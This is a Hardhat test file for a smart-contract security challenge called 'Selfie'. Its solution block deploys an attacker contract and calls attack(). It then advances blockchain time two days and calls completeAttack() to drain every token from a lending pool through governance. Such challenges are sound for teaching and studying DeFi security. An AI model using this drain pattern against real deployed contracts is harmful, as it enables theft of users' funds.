const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Selfie", function () {
  let deployer, player;

  const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther("2000000"); // 2 million tokens
  const TOKENS_IN_POOL = ethers.utils.parseEther("1500000"); // 1.5 million tokens

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, player] = await ethers.getSigners();

    const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory(
      "DamnValuableTokenSnapshot",
      deployer
    );
    const SimpleGovernanceFactory = await ethers.getContractFactory(
      "SimpleGovernance",
      deployer
    );
    const SelfiePoolFactory = await ethers.getContractFactory(
      "SelfiePool",
      deployer
    );

    this.token = await DamnValuableTokenSnapshotFactory.deploy(
      TOKEN_INITIAL_SUPPLY
    );
    this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
    this.pool = await SelfiePoolFactory.deploy(
      this.token.address,
      this.governance.address
    );

    await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

    expect(await this.token.balanceOf(this.pool.address)).to.be.equal(
      TOKENS_IN_POOL
    );
  });

  it("Execution", async function () {
    /** CODE YOUR SOLUTION HERE */
    const drainSelfiePoolCF = await ethers.getContractFactory(
      "DrainSelfiePool",
      player
    );
    const DrainSelfiePool = await drainSelfiePoolCF.deploy(this.pool.address);

    await DrainSelfiePool.attack();

    // fast forward the evm time by 2 days here
    await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days

    await DrainSelfiePool.completeAttack();
  });

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // Player has taken all tokens from the pool
    expect(await this.token.balanceOf(player.address)).to.be.equal(
      TOKENS_IN_POOL
    );
    expect(await this.token.balanceOf(this.pool.address)).to.be.equal("0");
  });
});
